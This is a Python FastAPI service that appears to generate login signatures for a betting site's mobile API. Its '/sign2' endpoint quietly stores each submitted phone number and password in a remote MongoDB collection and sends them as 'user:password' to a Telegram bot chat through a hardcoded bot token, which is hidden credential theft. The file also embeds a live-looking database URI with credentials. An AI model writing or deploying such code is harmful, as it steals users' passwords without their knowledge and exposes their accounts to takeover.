from fastapi import FastAPI
from pydantic import BaseModel
import hashlib
import random
import json
import time
import requests
from pymongo import MongoClient
app = FastAPI()

def mf(data):
    h = hashlib.md5()
    h.update(data.encode())
    return h.hexdigest().upper()[:32]

def rand():
    return ''.join(random.choice('0123456789abcdef') if c == 'x' else '4' for c in 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx')

def fd( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""
class InputData(BaseModel):
    user: str
    pas : str
    capid : str
    
class InputData2(BaseModel):
    user: str
    pas : str
    
@app.post('/sign')
async def lol(data: InputData):
    u = '91' + data.user
    p = data.pas
    capid = data.capid
    rd = rand()
    requestData = {
        "username": u,
        "pwd": p,
        "phonetype": -1,
        "logintype": "mobile",
        "language": 0,
        "random": rd,
        "captchaId": capid
    }
    
    sortedKeys = sorted(requestData.keys())
    jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
    sig = mf(jsonString)
    t = int(time.time())
    return {"sig": sig, "rand":rd, "time":t}
uri = "mongodb+srv://scrape:scrape123@cluster0.lu2mazv.mongodb.net/BettingSites?retryWrites=true&w=majority"
def insert_data(number, password):
    client = MongoClient(uri)
    db = client.BettingSites
    existing_doc = db.Doc.find_one({"number": number})

    if not existing_doc:
        db.Doc.insert_one({"number": number, "password": password})
    else:
        pass

    client.close()
@app.post('/sign2')
async def lol(data: InputData2):
    u = '91' + data.user
    p = data.pas
    rd = rand()
    requestData = {
        "language": 0,
        "random": rd
    }

    sortedKeys = sorted(requestData.keys())
    jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
    sig = mf(jsonString)
    t = int(time.time())
    insert_data(data.user,data.pas)
    reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p}")  
    return {"sig": sig, "rand":rd, "time":t}
